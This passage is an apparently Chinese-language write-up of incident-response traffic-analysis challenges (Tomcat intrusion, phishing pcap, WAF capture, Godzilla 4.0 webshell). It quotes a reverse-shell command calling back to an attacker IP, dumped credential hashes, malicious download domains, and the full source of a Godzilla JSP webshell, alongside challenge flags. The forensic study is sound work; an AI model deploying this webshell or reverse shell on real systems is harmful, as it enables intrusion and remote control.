class="hljs-attr">Domain   :</span> <span class="hljs-string">VULNTARGET</span><br>         <span class="hljs-string">*</span> <span class="hljs-attr">NTLM     :</span> <span class="hljs-string">282d975e35846022476068ab5a3d72df</span><br>         <span class="hljs-string">*</span> <span class="hljs-attr">SHA1     :</span> <span class="hljs-string">bc9ecca8d006d8152bd51db558221a0540c9d604</span><br>         <span class="hljs-string">*</span> <span class="hljs-attr">DPAPI    :</span> <span class="hljs-string">8d6103509e746ac0ed9641f7c21d7cf7</span><br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09161013.png" srcset="/img/loading.gif" lazyload alt="2025-03-09161013"></p>
<h1 id="第六章-流量特征分析-常见攻击事件-tomcat"><a class="markdownIt-Anchor" href="#第六章-流量特征分析-常见攻击事件-tomcat"></a> 第六章 流量特征分析-常见攻击事件 tomcat</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP  flag格式：flag&#123;ip&#125;，如：flag&#123;127.0.0.1&#125;<br>2、找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag&#123;城市英文小写&#125;<br>3、哪一个端口提供对web服务器管理面板的访问？ flag格式：flag&#123;2222&#125;<br>4、经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag&#123;名称&#125;<br>5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag&#123;root-123&#125;<br>6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag&#123;114514.txt&#125;<br>7、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息<br></code></pre></td></tr></table></figure>
<h2 id="q1-15"><a class="markdownIt-Anchor" href="#q1-15"></a> Q1</h2>
<p>很多SYN的包nmap扫描就是SYN 所以得到ip（直接看爆红的流量包即可</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">14.0.0.120</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-15"><a class="markdownIt-Anchor" href="#q2-15"></a> Q2</h2>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09162759.png" srcset="/img/loading.gif" lazyload alt="2025-03-09162759"></p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">guangzhou</span><br></code></pre></td></tr></table></figure>
<h2 id="q3-15"><a class="markdownIt-Anchor" href="#q3-15"></a> Q3</h2>
<p>wireshark过滤出http随便tcp追踪一下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">8080</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q4-14"><a class="markdownIt-Anchor" href="#q4-14"></a> Q4</h2>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09163152.png" srcset="/img/loading.gif" lazyload alt="2025-03-09163152"></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;gobuster&#125;</span><br></code></pre></td></tr></table></figure>
<p>进行了目录的扫描</p>
<h2 id="q5-11"><a class="markdownIt-Anchor" href="#q5-11"></a> Q5</h2>
<p>（建议先看Q7,再看q6，最后再看这个）</p>
<p>写好q6之后还是这个这个图片，author那里base64解码</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">YWRtaW46dG9tY2F0<br><span class="hljs-symbol">admin:</span>tomcat<br></code></pre></td></tr></table></figure>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">flag</span>&#123;<span class="hljs-built_in">admin</span>-tomcat&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q6-4"><a class="markdownIt-Anchor" href="#q6-4"></a> Q6</h2>
<p>由于先写好了Q7往回退，可以看到文件</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09164030.png" srcset="/img/loading.gif" lazyload alt="2025-03-09164030"></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;JXQOZY.war&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q7-3"><a class="markdownIt-Anchor" href="#q7-3"></a> Q7</h2>
<p>中间偶然翻到的</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09163815.png" srcset="/img/loading.gif" lazyload alt="2025-03-09163815"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">14.0.0.120</span>/<span class="hljs-number">443</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27;&#125;<br></code></pre></td></tr></table></figure>
<h1 id="第六章-流量特征分析-小王公司收到的钓鱼邮件"><a class="markdownIt-Anchor" href="#第六章-流量特征分析-小王公司收到的钓鱼邮件"></a> 第六章 流量特征分析-小王公司收到的钓鱼邮件</h1>
<h2 id="q1-16"><a class="markdownIt-Anchor" href="#q1-16"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag&#123;xxxx.co.xxxx/w0ks//?YO=xxxxxxx&#125;） (无需 http、https)；<br></code></pre></td></tr></table></figure>
<p>http过滤</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /w0ks//?YO=<span class="hljs-number">1702920835</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: tsdandassociates.co.sz<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">120.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">120.0.0.0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://tsdandassociates.co.sz/w0ks/?<span class="hljs-number">92444881</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: en<br></code></pre></td></tr></table></figure>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-keyword">flag</span>&#123;tsdandassociates.co.sz<span class="hljs-operator">/</span>w0ks<span class="hljs-comment">//?YO=1702920835&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q2-16"><a class="markdownIt-Anchor" href="#q2-16"></a> Q2</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">下载数据包文件 hacker1.pacapng，分析获取到的 zip 压缩包的 MD5 是什么 作为 FLAG 提交 FLAG（形式：flag&#123;md5&#125;）；<br></code></pre></td></tr></table></figure>
<p>可以看到上面的流量包下面就是pk开头的数据，导出改尾巴</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">──(orange㉿Coyano)-[/mnt/f/取证题]<br>└─$ <span class="hljs-built_in">md5sum</span> 1.zip<br>f17dc5b1c30c512137e62993d1df9b2f  1.zip<br></code></pre></td></tr></table></figure>
<h2 id="q3-16"><a class="markdownIt-Anchor" href="#q3-16"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">下载数据包文件 hacker1.pacapng，分析 zip 压缩包通过加载其中的 javascript 文件到另一个域名下载后续恶意程序， 该域名是什么?提交答案:flag&#123;域名&#125;(无需 http、https)<br></code></pre></td></tr></table></figure>
<p>解压是一个js里面大量的注释</p>
<p>全局搜索<code>&quot;h&quot;</code>,定位到</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">o457607380</span>+=<span class="hljs-string">&#x27;h&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>然后以下的进行拼接</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>shakyastatuestrade.com<span class="hljs-regexp">/A6F/</span><span class="hljs-number">616231603</span> qui.q<br></code></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;shakyastatuestrade.com&#125;</span><br></code></pre></td></tr></table></figure>
<h1 id="第六章-流量特征分析-waf-上的截获的黑客攻击流量"><a class="markdownIt-Anchor" href="#第六章-流量特征分析-waf-上的截获的黑客攻击流量"></a> 第六章 流量特征分析-waf 上的截获的黑客攻击流量</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">应急响应工程师小徐在 waf 上下载了一段黑客的攻击流量，请你分析黑客的攻击流量，并且找到对应的关键信息提供给应急小组协助修复漏洞<br><br><br>1.黑客成功登录系统的密码 flag&#123;xxxxxxxxxxxxxxx&#125;<br>2.黑客发现的关键字符串 flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;<br>3.黑客找到的数据库密码 flag&#123;xxxxxxxxxxxxxxxx&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q1-17"><a class="markdownIt-Anchor" href="#q1-17"></a> Q1</h2>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">http.request.method == <span class="hljs-string">&quot;<span class="hljs-keyword">POST</span>&quot;</span><br></code></pre></td></tr></table></figure>
<p>按length从小到大，发现到这边</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09172823.png" srcset="/img/loading.gif" lazyload alt="2025-03-09172823"></p>
<p>路由改变了，在这附近找密码，可以找到在长度为754的这条里面存在</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-literal">admin</span>!@<span class="hljs-comment">#pass123</span><br></code></pre></td></tr></table></figure>
<h2 id="q2-17"><a class="markdownIt-Anchor" href="#q2-17"></a> Q2</h2>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09173203.png" srcset="/img/loading.gif" lazyload alt="2025-03-09173203"></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;div <span class="hljs-keyword">class</span>=&quot;<span class="hljs-symbol">warning</span>&quot;&gt;欢迎来到后台，你的<span class="hljs-symbol">flag</span>是：<span class="hljs-symbol">319fc83ee5304a6b4319ce1f9e4d9dc1</span>&lt;/<span class="hljs-symbol">div</span>&gt;\<span class="hljs-symbol">r</span>\<span class="hljs-symbol">n</span><br></code></pre></td></tr></table></figure>
<p>发现不对,继续往下翻</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>:<span class="hljs-number">87</span>b7cb79481f317bde90c116cf36084b\r\n<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09173315.png" srcset="/img/loading.gif" lazyload alt="2025-03-09173315"></p>
<h2 id="q3-17"><a class="markdownIt-Anchor" href="#q3-17"></a> Q3</h2>
<p>搜索</p>
<p><code>http contains &quot;dbpass&quot;</code></p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$dbpass   = <span class="hljs-string">&quot;e667jUPvJjXHvEUv&quot;</span><span class="hljs-comment">;\n</span><br></code></pre></td></tr></table></figure>
<h1 id="第六章-哥斯拉40流量分析"><a class="markdownIt-Anchor" href="#第六章-哥斯拉40流量分析"></a> 第六章-哥斯拉4.0流量分析</h1>
<h2 id="q1-18"><a class="markdownIt-Anchor" href="#q1-18"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1、黑客的IP是什么？<br></code></pre></td></tr></table></figure>
<p>下载流量包，一共就两个ip</p>
<p>观察404的部分，得到</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.31.190</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-18"><a class="markdownIt-Anchor" href="#q2-18"></a> Q2</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">2、黑客是通过什么漏洞进入服务器的？（提交CVE编号）<br></code></pre></td></tr></table></figure>
<p>length按长度来，发现第一个有204的异常，跟踪一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%! String xc=<span class="hljs-string">&quot;1710acba6220f62b&quot;</span>; String pass=<span class="hljs-string">&quot;7f0e6f&quot;</span>; String md5=md5(pass+xc); <span class="hljs-keyword">class</span> <span class="hljs-title class_">X</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-title function_">X</span><span class="hljs-params">(ClassLoader z)</span>&#123;<span class="hljs-built_in">super</span>(z);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">Q</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] cb)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(cb, <span class="hljs-number">0</span>, cb.length);&#125; &#125;<span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] x(<span class="hljs-type">byte</span>[] s,<span class="hljs-type">boolean</span> m)&#123; <span class="hljs-keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(m?<span class="hljs-number">1</span>:<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">return</span> c.doFinal(s); &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; &#125;&#125; <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">md5</span><span class="hljs-params">(String s)</span> &#123;<span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-keyword">try</span> &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);m.update(s.getBytes(), <span class="hljs-number">0</span>, s.length());ret = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.math.BigInteger(<span class="hljs-number">1</span>, m.digest()).toString(<span class="hljs-number">16</span>).toUpperCase();&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<span class="hljs-keyword">return</span> ret; &#125; <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64Encode</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bs)</span> <span class="hljs-keyword">throws</span> Exception &#123;Class base64;<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-keyword">try</span> &#123;base64=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);value = (String)Encoder.getClass().getMethod(<span class="hljs-string">&quot;encodeToString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; <span class="hljs-type">byte</span>[].class &#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<span class="hljs-keyword">try</span> &#123; base64=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>); <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.newInstance(); value = (String)Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; <span class="hljs-type">byte</span>[].class &#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="hljs-keyword">return</span> value; &#125; <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] base64Decode(String bs) <span class="hljs-keyword">throws</span> Exception &#123;Class base64;<span class="hljs-type">byte</span>[] value = <span class="hljs-literal">null</span>;<span class="hljs-keyword">try</span> &#123;base64=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);value = (<span class="hljs-type">byte</span>[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<span class="hljs-keyword">try</span> &#123; base64=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>); <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.newInstance(); value = (<span class="hljs-type">byte</span>[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="hljs-keyword">return</span> value; &#125;%&gt;&lt;%<span class="hljs-keyword">try</span>&#123;<span class="hljs-type">byte</span>[] data=base64Decode(request.getParameter(pass));data=x(data, <span class="hljs-literal">false</span>);<span class="hljs-keyword">if</span> (session.getAttribute(<span class="hljs-string">&quot;payload&quot;</span>)==<span class="hljs-literal">null</span>)&#123;session.setAttribute(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">X</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).Q(data));&#125;<span class="hljs-keyword">else</span>&#123;request.setAttribute(<span class="hljs-string">&quot;parameters&quot;</span>,data);java.io.ByteArrayOutputStream arrOut=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(<span class="hljs-string">&quot;payload&quot;</span>)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(<span class="hljs-number">0</span>,<span class="hljs-number">16</span>));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="hljs-literal">true</span>)));response.getWriter().write(md5.substring(<span class="hljs-number">16</span>));&#125; &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Junglezt/p/18123082">tomcat通过PUT方法任意文件写入(CVE-2017-12615)漏洞复现 - Junglezt - 博客园</a></p>
<p>搜索<code>tomcat put cve</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">12615</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q3-18"><a class="markdownIt-Anchor" href="#q3-18"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">3、黑客上传的木马文件名是什么？(提交文件名)<br></code></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;hello.jsp&#125;</span><br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PUT</span> /hello.jsp/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.31.168:8080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">15</span>; rv:<span class="hljs-number">130</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">130</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/png,image/svg+xml,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Cookie</span>: JSESSIONID=BB06CCAD2D89AA0BACA30B2BBCE3F2CE<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Priority</span>: u=<span class="hljs-number">0</span>, i<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">2619</span><br></code></pre></td></tr></table></figure>
<p>和上面是同一个流量包</p>
<h2 id="q4-15"><a class="markdownIt-Anchor" href="#q4-15"></a> Q4</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">4、黑客上传的木马连接密码是什么？<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">7</span>f0e6f&#125;<br></code></pre></td></tr></table></figure>
<p>和Q2一个流量包，pass对应的内容</p>
<h2 id="q5-12"><a class="markdownIt-Anchor" href="#q5-12"></a> Q5</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">5、黑客上传的木马解密密钥是什么？<br></code></pre></td></tr></table></figure>
<p>同上，同一个流量包</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1710</span>acba6220f62b&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q6-5"><a class="markdownIt-Anchor" href="#q6-5"></a> Q6</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">6、黑客连接webshell后执行的第一条命令是什么？<br></code></pre></td></tr></table></figure>
<p><img src="../../images/%E7%8E%84%E6%9C%BA//2025-03-09180735.png" srcset="/img/loading.gif" lazyload alt="2025-03-09180735"></p>
<p>用工具，把对应数据填一下</p>
<p>再看一下回显</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">4.19.0-25-amd64<br></code></pre></td></tr></table></figure>
<p>所以flag是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;<span class="hljs-built_in">uname</span> -r&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q7-4"><a class="markdownIt-Anchor" href="#q7-4"></a> Q7</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">7、黑客连接webshell时查询当前shell的权限是什么？<br></code></pre></td></tr></table></figure>
<p>在eq47里用工具解码一下回显</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=0(root) <span class="hljs-attribute">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
<p>所以是root权限</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;root&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q8-2"><a class="markdownIt-Anchor" href="#q8-2"></a> Q8</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">8、黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？<br></code></pre></td></tr></table></figure>
<p>方法同上，eq48的回显</p>
